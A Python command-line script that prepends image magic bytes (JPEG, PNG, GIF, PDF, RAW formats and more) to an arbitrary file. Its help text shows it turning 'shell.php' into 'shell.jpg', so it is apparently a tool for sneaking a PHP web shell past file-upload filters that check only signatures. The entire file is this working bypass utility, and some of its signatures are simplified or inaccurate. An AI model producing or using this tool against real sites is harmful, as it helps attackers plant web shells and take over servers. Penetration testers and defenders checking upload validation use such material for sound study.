#!/usr/bin/env python3
import sys
import os

# ANSI color codes
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"
RESET   = "\033[0m"

# Magic numbers for different image formats
MAGIC_NUMBERS = {
    'jpg': b'\xFF\xD8\xFF\xE0',          # JPEG
    'jpeg': b'\xFF\xD8\xFF\xE0',         # JPEG (alternative)
    'png': b'\x89PNG\r\n\x1a\n',         # PNG
    'gif': b'GIF89a',                    # GIF
    'bmp': b'BM',                        # BMP
    'webp': b'RIFF\x00\x00\x00\x00WEBPVP8',  # WEBP (simplified)
    'tiff': b'II*\x00',                  # TIFF (little-endian)
    'tif': b'II*\x00',                   # TIFF (alternative)
    'ico': b'\x00\x00\x01\x00',           # ICO (icon)
    'psd': b'8BPS',                      # PSD (Photoshop)
    'svg': b'<?xml',                     # SVG (XML text)
    'pdf': b'%PDF-',                     # PDF (not an image, but common)
    'heic': b'\x00\x00\x00 ftypheic',     # HEIC (modern image format)
    'avif': b'\x00\x00\x00 ftypavif',     # AVIF (modern image format)
    'cr2': b'II*\x00\x10\x00\x00\x00CR',  # CR2 (Canon RAW)
    'nef': b'MM\x00\x2A',                # NEF (Nikon RAW)
    'arw': b'II*\x00\x08\x00\x00\x00',    # ARW (Sony RAW)
}

def add_magic_numbers(image_format, input_file, output_file):
    # Check if the format is supported
    if image_format not in MAGIC_NUMBERS:
        print(f"{RED}Unsupported format: {image_format}{RESET}")
        print("Supported formats: " + ", ".join(MAGIC_NUMBERS.keys()))
        sys.exit(1)

    # Get the magic numbers for the selected format
    magic_numbers = MAGIC_NUMBERS[image_format]

    # Build absolute paths based on the current working directory
    input_path = os.path.abspath(input_file)
    output_path = os.path.abspath(output_file)

    # Read the content of the input file
    try:
        with open(input_path, 'rb') as f:
            file_content = f.read()
    except Exception as e:
        print(f"{RED}Error reading {input_path}: {e}{RESET}")
        sys.exit(1)

    # Write the output file with the magic numbers at the beginning
    try:
        with open(output_path, 'wb') as f:
            f.write(magic_numbers + file_content)
    except Exception as e:
        print(f"{RED}Error writing {output_path}: {e}{RESET}")
        sys.exit(1)

    print(f"{GREEN}File generated: {output_path}{RESET}")
    print(f"{CYAN}Magic numbers for {image_format} added at the beginning of the file.{RESET}")

def show_help():
    script_name = os.path.basename(sys.argv[0])
    print(f"{YELLOW}Usage: python {script_name} <format> <input_file> <output_file>{RESET}")
    print(f"{YELLOW}Example: python {script_name} jpg shell.php shell.jpg{RESET}")
    print(f"\n{MAGENTA}Supported image formats:{RESET}")
    for fmt in MAGIC_NUMBERS.keys():
        print(f"  - {BLUE}{fmt}{RESET}")
    sys.exit(0)

if __name__ == "__main__":
    # Show help if an incorrect number of arguments is provided or if --help is used
    if len(sys.argv) != 4 or sys.argv[1] == "--help":
        show_help()

    # Get the arguments
    image_format = sys.argv[1].lower()
    input_file   = sys.argv[2]
    output_file  = sys.argv[3]

    # Execute the main function
    add_magic_numbers(image_format, input_file, output_file)
